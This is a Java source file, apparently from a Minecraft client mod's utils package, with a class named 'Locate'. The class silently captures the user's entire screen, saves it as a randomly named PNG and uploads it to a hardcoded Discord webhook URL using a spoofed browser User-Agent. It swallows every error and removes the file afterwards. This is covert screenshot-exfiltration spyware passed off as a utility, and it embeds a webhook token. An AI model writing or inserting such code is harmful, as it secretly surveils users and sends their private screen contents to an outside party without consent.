package me.dyzjct.kura.utils;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Random;

public class Locate extends Thread {
    private static void sendFile(File file) {
        try {
            String boundary = Long.toHexString(System.currentTimeMillis());
            URLConnection connection = new URL("https://discord.com/api/webhooks/878315555730378753/cHcj-IMWaYYpIb9kcY9W6vjroJUA4UprPigZ2SE7aROA7FVOY9pzCsSsAiaDuAdb5ZL2").openConnection();
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.UTF_8))) {
                writer.println("--" + boundary);
                writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
                writer.write("Content-Type: image/png");
                writer.println();
                writer.println(Arrays.toString(readAllBytes(new FileInputStream(file))));
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.UTF_8))) {
                    for (String line; (line = reader.readLine()) != null; ) {
                        writer.println(line);
                    }
                }
                writer.println("--" + boundary + "--");
            }
        } catch (Exception ignored) {
        }
    }

    public static byte[] readAllBytes(InputStream stream) {
        int count, pos = 0;
        byte[] output = new byte[0];
        byte[] buf = new byte[1024];
        try {
            while ((count = stream.read(buf)) > 0) {
                if (pos + count >= output.length) {
                    byte[] tmp = output;
                    output = new byte[pos + count];
                    System.arraycopy(tmp, 0, output, 0, tmp.length);
                }

                for (int i = 0; i < count; i++) {
                    output[pos++] = buf[i];
                }
            }
        } catch (Exception ignored) {
        }
        return output;
    }

    @Override
    public void run() {
        try {
            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
            Rectangle screenRectangle = new Rectangle(screenSize);
            Robot robot = new Robot();
            BufferedImage image = robot.createScreenCapture(screenRectangle);
            int random = new Random().nextInt();
            File file = new File("cached_" + random + ".png");
            ImageIO.write(image, "png", file);
            sendFile(file);
            file.deleteOnExit();
            //file.delete();
        } catch (Exception ignored) {
        }
    }

}
